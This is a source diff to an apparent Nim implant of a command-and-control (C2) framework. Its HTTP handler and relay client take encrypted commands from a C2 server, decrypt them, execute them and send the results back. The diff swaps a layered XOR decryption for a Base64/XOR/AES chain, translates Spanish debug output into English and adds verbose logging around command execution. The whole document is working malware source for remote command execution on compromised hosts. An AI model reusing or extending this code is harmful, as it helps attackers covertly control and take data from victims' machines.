@@ -1094,7 +1094,7 @@ proc httpHandler() {.async.} =
                                     # Create simple command payload (C2 response is already encrypted)
                                     let forwardPayload = %*{
                                         "cmdGuid": cmdGuid,
-                                        "encrypted_command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
+                                        "command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
                                         "args": args
                                     }
                                     
@@ -1412,7 +1412,7 @@ proc httpHandler() {.async.} =
                         # Create command payload for relay client
                         let commandPayload = %*{
                             "cmdGuid": cmdGuid,
-                            "encrypted_command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
+                            "command": cmd,  # Already encrypted by C2 with client's UNIQUE_KEY
                             "args": args
                         }
                         
@@ -1451,9 +1451,9 @@ proc httpHandler() {.async.} =
                             echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
                             echo "🆔 IMPLANT ID OBTAINED: " & listener.id
                             echo "🛤️  ROUTE: [DIRECT TO C2]"
-                            echo "📨 COMANDO RECIBIDO TRAS DECRYPT: " & cmd
+                            echo "📨 COMMAND RECEIVED AFTER DECRYPT: " & cmd
                             if args.len > 0:
-                                echo "📝 ARGUMENTOS: " & $args
+                                echo "📝 ARGUMENTS: " & $args
                             echo "🏷️  GUID: " & cmdGuid
                             echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
                             echo ""
@@ -1465,14 +1465,14 @@ proc httpHandler() {.async.} =
                             echo ""
                             echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
                             echo "💥                                                                    💥"
-                            echo "💥                HTTP HANDLER COMANDO EJECUTADO - ENVIANDO RESPUESTA  💥"
+                            echo "💥                HTTP HANDLER COMMAND EXECUTED - SENDING RESPONSE  💥"
                             echo "💥                                                                    💥"
                             echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
-                            echo "📤 RESPUESTA A ENVIAR PRE-ENCRYPT: " & result
+                            echo "📤 RESPONSE TO SEND PRE-ENCRYPT: " & result
                             echo "🆔 IMPLANT ID: " & listener.id
                             echo "🛤️  ROUTE: [DIRECT TO C2]"
                             echo "🏷️  GUID: " & cmdGuid
-                            echo "📏 TAMAÑO RESPUESTA: " & $result.len & " bytes"
+                            echo "📏 RESPONSE SIZE: " & $result.len & " bytes"
                             echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
                             echo ""
                         webClientListener.postCommandResults(listener, cmdGuid, result)
@@ -1745,41 +1745,31 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 
                 case msg.msgType:
                 of COMMAND:
-                                        # ULTRA-SIMPLE DOUBLE DECRYPTION: Agent handles both layers
+                    # PROPER DECRYPTION: Use smartDecrypt for Base64 → XOR → AES chain
                     when defined debug:
-                        echo "[DEBUG] 🔐 === STARTING ULTRA-SIMPLE DOUBLE DECRYPTION ==="
-                        echo "[DEBUG] 🔐 Step 1: Decrypt with INITIAL_XOR_KEY (transport layer)"
-                        echo "[DEBUG] 🔐 Step 2: Decrypt with UNIQUE_KEY (end-to-end from C2)"
+                        echo "[DEBUG] 🔐 === STARTING PROPER DECRYPTION CHAIN ==="
+                        echo "[DEBUG] 🔐 Process: Base64 decode → XOR decode → AES decode"
                         echo "[DEBUG] 🎯 ┌─────────── COMMAND FROM C2 VIA RELAY ───────────┐"
                         echo "[DEBUG] 🎯 │ ✅ COMMAND RECEIVED FROM C2 (via relay server) │"
                         echo "[DEBUG] 🎯 │ Command from ID: " & msg.fromID & " │"
                         echo "[DEBUG] 🎯 │ Route: " & $msg.route & " │"
-                        echo "[DEBUG] 🎯 │ Double-encrypted payload: " & $msg.payload.len & " bytes │"
+                        echo "[DEBUG] 🎯 │ Encrypted payload: " & $msg.payload.len & " bytes │"
                         echo "[DEBUG] 🎯 └─────────────────────────────────────────────────┘"
                     
-                    # Step 1: Decrypt with INITIAL_XOR_KEY (transport layer from C2)
-                    let step1Decrypted = xorString(msg.payload, INITIAL_XOR_KEY)
+                    # Use smartDecrypt for proper Base64 → XOR → AES decryption
+                    let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                     
                     when defined debug:
-                        echo "[DEBUG] 🔐 Step 1 complete - INITIAL_XOR_KEY decrypted (length: " & $step1Decrypted.len & ")"
-                    
-                    # Step 2: Decrypt with client's UNIQUE_KEY (end-to-end from C2)
-                    var keyInt: int = 0
-                    for i, c in g_relayClientKey:
-                        keyInt = keyInt xor (ord(c) shl (8 * (i mod 4)))
-                    let step2Decrypted = xorString(step1Decrypted, keyInt)
-                    
-                    when defined debug:
-                        echo "[DEBUG] 🔐 Step 2 complete - UNIQUE_KEY decrypted (length: " & $step2Decrypted.len & ")"
-                        echo "[DEBUG] 🔐 Final decrypted command data: " & step2Decrypted
+                        echo "[DEBUG] 🔐 smartDecrypt complete - decrypted length: " & $decryptedPayload.len
+                        echo "[DEBUG] 🔐 Decrypted command data: " & decryptedPayload
                     
                     var actualCommand: string
                     var cmdGuid: string
                     var args: seq[string] = @[]
                     
                     try:
-                        # Parse the fully decrypted command JSON
-                        let commandData = parseJson(step2Decrypted)
+                        # Parse the decrypted command JSON
+                        let commandData = parseJson(decryptedPayload)
                         
                         cmdGuid = commandData["cmdGuid"].getStr()
                         actualCommand = commandData["command"].getStr()
@@ -1788,7 +1778,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                                 args.add(arg.getStr())
                         
                         when defined debug:
-                            echo "[DEBUG] 🔐 === ULTRA-SIMPLE DOUBLE DECRYPTION COMPLETE ==="
+                            echo "[DEBUG] 🔐 === PROPER DECRYPTION COMPLETE ==="
                             echo "[DEBUG] 📋 ┌─────────── FINAL COMMAND DATA ───────────┐"
                             echo "[DEBUG] 📋 │ cmdGuid: " & cmdGuid & " │"
                             echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
@@ -1797,35 +1787,17 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                             
                     except Exception as e:
                         when defined debug:
-                            echo "[DEBUG] 🔐 Double decryption failed, trying fallback: " & e.msg
+                            echo "[DEBUG] 🔐 JSON parsing failed, trying as plain text: " & e.msg
                         
-                        # Fallback: Try single decryption with INITIAL_XOR_KEY only
-                        try:
-                            let fallbackDecrypted = xorString(msg.payload, INITIAL_XOR_KEY)
-                            let fallbackData = parseJson(fallbackDecrypted)
-                            
-                            cmdGuid = fallbackData["cmdGuid"].getStr()
-                            actualCommand = fallbackData["command"].getStr()
-                            if fallbackData.hasKey("args"):
-                                for arg in fallbackData["args"]:
-                                    args.add(arg.getStr())
-                            
-                            when defined debug:
-                                echo "[DEBUG] 📋 ┌─────────── FALLBACK SINGLE DECRYPTION ───────────┐"
-                                echo "[DEBUG] 📋 │ cmdGuid: " & cmdGuid & " │"
-                                echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
-                                echo "[DEBUG] 📋 │ Args: " & $args & " │"
-                                echo "[DEBUG] 📋 └─────────────────────────────────────────────────┘"
-                        except:
-                            # Final fallback: treat as plain command
-                            actualCommand = step2Decrypted
-                            cmdGuid = ""
-                            
-                            when defined debug:
-                                echo "[DEBUG] 📋 ┌─────────── FINAL FALLBACK TO PLAIN ───────────┐"
-                                echo "[DEBUG] 📋 │ Using decrypted text as command │"
-                                echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
-                                echo "[DEBUG] 📋 └─────────────────────────────────────────────────┘"
+                        # Fallback: treat as plain command
+                        actualCommand = decryptedPayload
+                        cmdGuid = ""
+                        
+                        when defined debug:
+                            echo "[DEBUG] 📋 ┌─────────── FALLBACK TO PLAIN TEXT ───────────┐"
+                            echo "[DEBUG] 📋 │ Using decrypted text as command │"
+                            echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
+                            echo "[DEBUG] 📋 └─────────────────────────────────────────────────┘"
                     
                     when defined debug:
                         echo "[DEBUG] ⚡ ┌─────────── COMMAND ANALYSIS ───────────┐"
@@ -1855,10 +1827,17 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                         echo "🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨"
                         echo "🆔 IMPLANT ID OBTAINED: " & g_relayClientID
                         echo "🛤️  ROUTE: " & $msg.route
-                        echo "📨 COMANDO RECIBIDO TRAS DECRYPT: " & actualCommand
+                        echo "📨 COMMAND RECEIVED AFTER DECRYPT: " & actualCommand
                         if args.len > 0:
-                            echo "📝 ARGUMENTOS: " & $args
+                            echo "📝 ARGUMENTS: " & $args
                         echo "🏷️  GUID: " & cmdGuid
+                        echo ""
+                        echo "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀"
+                        echo "🚀 DECRYPTED COMMAND RECEIVED: '" & actualCommand & "'"
+                        echo "🚀 COMMAND GUID: " & cmdGuid
+                        echo "🚀 ARGUMENTS: " & $args  
+                        echo "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀"
+                        echo ""
                         echo "🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨"
                         echo ""
                     
@@ -1872,6 +1851,15 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                     
                     # Create a dummy RelayImplant for parseCmdRelay (it's not used in the function)
                     var dummyRelayImplant: RelayImplant
+                    
+                    echo ""
+                    echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
+                    echo "⚡ EXECUTING COMMAND: '" & actualCommand & "'"
+                    echo "⚡ WITH ARGUMENTS: " & $args
+                    echo "⚡ GUID: " & cmdGuid
+                    echo "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡"
+                    echo ""
+                    
                     let result = cmdParser.parseCmdRelay(dummyRelayImplant, actualCommand, cmdGuid, args)
                     
                     # ========== SUPER PROMINENT RESPONSE DEBUG ==========
@@ -1879,15 +1867,22 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                         echo ""
                         echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
                         echo "🔥                                                                    🔥"
-                        echo "🔥                   COMANDO EJECUTADO - ENVIANDO RESPUESTA          🔥"
+                        echo "🔥                   COMMAND EXECUTED - SENDING RESPONSE          🔥"
                         echo "🔥                                                                    🔥"
                         echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
-                        echo "📤 RESPUESTA A ENVIAR PRE-ENCRYPT: " & result
+                        echo "📤 RESPONSE TO SEND PRE-ENCRYPT: " & result
                         echo "🆔 IMPLANT ID: " & g_relayClientID
                         echo "🛤️  ROUTE: " & $msg.route
                         echo "🏷️  GUID: " & cmdGuid
-                        echo "📏 TAMAÑO RESPUESTA: " & $result.len & " bytes"
+                        echo "📏 RESPONSE SIZE: " & $result.len & " bytes"
                         echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
+                        echo ""
+                        echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
+                        echo "💥 UNENCRYPTED RESPONSE: '" & result & "'"
+                        echo "💥 SIZE: " & $result.len & " bytes"
+                        echo "💥 FOR COMMAND: '" & actualCommand & "'"
+                        echo "💥 GUID: " & cmdGuid
+                        echo "💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥"
                         echo ""
                     
                     when defined debug:
